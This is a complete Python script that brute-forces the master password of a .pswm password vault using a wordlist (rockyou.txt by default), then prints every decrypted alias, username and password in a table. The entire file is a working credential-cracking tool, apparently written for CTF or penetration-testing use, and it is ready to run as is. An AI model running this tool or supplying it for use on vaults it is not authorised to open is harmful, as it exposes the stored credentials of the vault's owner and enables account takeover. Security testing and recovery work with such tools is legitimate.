#!/usr/bin/env python3

import os
import cryptocode
import argparse
from prettytable import PrettyTable

DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"

def try_decrypt_with_password(vault_file, password):
    if not os.path.isfile(vault_file):
        print(f"Password vault file not found: {vault_file}")
        return False, ""

    with open(vault_file, "r") as file:
        encrypted_text = file.read()

    decrypted_text = cryptocode.decrypt(encrypted_text, password)
    if decrypted_text is not False:
        return True, decrypted_text

    return False, ""

def format_decrypted_content(decrypted_content):
    table = PrettyTable()
    table.field_names = ["Alias", "Username", "Password"]
    table.align = "l"

    for line in decrypted_content.splitlines():
        try:
            alias, username, password = line.split("\t")
            table.add_row([alias, username, password])
        except ValueError:
            continue
    
    print("Decrypted Content:")
    print(table)

def brute_force_decrypt(vault_file, wordlist_path):
    print(f"Starting brute force attack using wordlist: {wordlist_path}")
    with open(wordlist_path, "r", encoding="latin-1") as wordlist:
        for line in wordlist:
            password = line.strip()
            success, decrypted_content = try_decrypt_with_password(vault_file, password)
            if success:
                print(f"Success! Decrypted using password: {password}")
                format_decrypted_content(decrypted_content)
                break
        else:
            print("Brute force failed. No password found in the wordlist.")

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Brute force decrypt a .pswm password vault using a wordlist",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument("vault_file", help="Path to the .pswm password vault file")
    parser.add_argument(
        "-w", "--wordlist", 
        help=f"Path to the wordlist (default: {DEFAULT_WORDLIST})", 
        default=DEFAULT_WORDLIST)

    return parser.parse_args()

def main():
    args = parse_arguments()
    vault_file = args.vault_file
    wordlist_path = args.wordlist
    brute_force_decrypt(vault_file, wordlist_path)

if __name__ == "__main__":
    main()
